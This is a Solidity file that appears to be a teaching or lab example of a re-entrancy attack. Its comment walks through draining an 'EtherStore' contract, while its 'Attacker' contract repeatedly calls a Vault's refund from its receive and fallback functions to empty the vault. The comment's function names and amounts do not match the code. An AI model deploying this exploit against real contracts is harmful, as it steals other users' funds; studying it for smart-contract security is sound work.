// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ether back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

import "./Vault.sol";

contract Attacker {
    Vault public vault;
    uint256 public constant AMOUNT = 100_000 gwei;

    constructor(address _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

    receive() external payable {
        if (address(vault).balance >= AMOUNT) {
            vault.refund();
        }
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(vault).balance >= AMOUNT) {
            vault.refund();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        vault.donate{value: AMOUNT}();
        vault.refund();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
